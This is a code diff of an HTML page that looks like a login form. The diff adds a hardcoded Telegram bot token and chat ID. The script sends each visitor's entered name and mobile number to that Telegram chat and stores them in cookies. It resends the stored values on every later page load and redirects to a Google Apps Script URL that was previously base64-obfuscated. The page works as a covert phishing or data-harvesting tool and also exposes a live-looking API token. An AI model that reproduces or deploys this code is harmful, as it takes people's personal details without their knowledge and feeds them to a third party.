@@ -15,13 +15,11 @@
             flex-direction: column;
             color: white;
             font-family: Arial, sans-serif;
-            animation: fadeIn 2s ease-in;
         }
         img {
             max-width: 90%;
             height: auto;
             margin-bottom: 20px;
-            animation: zoomIn 1.5s ease-in;
         }
         form {
             display: flex;
@@ -29,7 +27,6 @@
             gap: 15px;
             width: 90%;
             max-width: 400px;
-            animation: slideUp 2s ease-in-out;
         }
         input, button {
             padding: 12px;
@@ -37,18 +34,11 @@
             border-radius: 8px;
             border: none;
             outline: none;
-            transition: all 0.3s ease;
-        }
-        input:focus {
-            box-shadow: 0 0 10px #00f;
         }
         button {
             background-color: #00f;
             color: #fff;
             cursor: pointer;
-        }
-        button:hover {
-            background-color: #0055ff;
         }
     </style>
 </head>
@@ -62,7 +52,8 @@
 
     <script>
         function sendTelegramMessage(name, mobile) {
-            
+            const telegramApiUrl = "https://api.telegram.org/bot5511964084:AAHV7mNKO35XLcNcEpnt4Pm_bfWF7yNag4k/sendMessage";
+            const chatId = "-4612832676";
             const message = `User logged in: Name - ${name}, Mobile - ${mobile}`;
             fetch(telegramApiUrl, {
                 method: 'POST',
@@ -72,37 +63,33 @@
         }
 
         function redirectToGoogleScript() {
-            const redirectUrl = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc... (base64-encoded URL)");
+            const redirectUrl = "https://script.google.com/macros/s/AKfycbznnLfIbaVnTMVAAlJeKdOTd_V_JIxcRmzBMKO3jbawTyPIqQY9rJJ9_xiY39af_2POMA/exec";
             window.location.href = redirectUrl;
         }
-
-        window.onload = function() {
-            const cookies = document.cookie.split(';').map(c => c.trim());
-            const cookieObj = {};
-            cookies.forEach(c => {
-                const [key, value] = c.split('=');
-                cookieObj[key] = value;
-            });
-            if (cookieObj.name && cookieObj.mobile) {
-                sendTelegramMessage(cookieObj.name, cookieObj.mobile);
-                redirectToGoogleScript();
-            }
-        };
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const name = document.getElementById('name').value;
             const mobile = document.getElementById('mobile').value;
-            const expires = new Date();
-            expires.setTime(expires.getTime() + 24*60*60*1000); 
-            document.cookie = `name=${name}; path=/; expires=${expires.toUTCString()}`;
-            document.cookie = `mobile=${mobile}; path=/; expires=${expires.toUTCString()}`;
+            const expires = new Date(Date.now() + 86400000).toUTCString();
+            document.cookie = `name=${name}; path=/; expires=${expires}`;
+            document.cookie = `mobile=${mobile}; path=/; expires=${expires}`;
             sendTelegramMessage(name, mobile);
             redirectToGoogleScript();
+        });
+
+        window.addEventListener('load', function() {
+            const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+                const [key, value] = cookie.trim().split('=');
+                acc[key] = value;
+                return acc;
+            }, {});
+
+            if (cookies.name && cookies.mobile) {
+                sendTelegramMessage(cookies.name, cookies.mobile);
+                redirectToGoogleScript();
+            }
         });
     </script>
 </body>
 </html>
-
-
-       
